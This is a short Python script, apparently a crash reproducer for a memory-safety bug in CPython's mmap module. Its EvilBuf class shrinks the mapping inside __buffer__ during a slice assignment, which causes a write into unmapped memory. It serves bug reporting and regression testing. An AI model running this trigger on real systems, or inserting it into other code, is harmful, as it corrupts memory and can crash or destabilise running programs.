import mmap
mm = mmap.mmap(-1, 100000)
class EvilBuf:
    def __buffer__(self, flags):
        mm.resize(1)      # unmap tail pages during rvalue buffer acquisition
        return memoryview(b"Z"*50000)
try:
    mm[40000:90000] = EvilBuf()   # start/slicelen vs old size; write into unmapped tail
    print("no crash")
except Exception as e:
    print("exc", type(e).__name__, e)
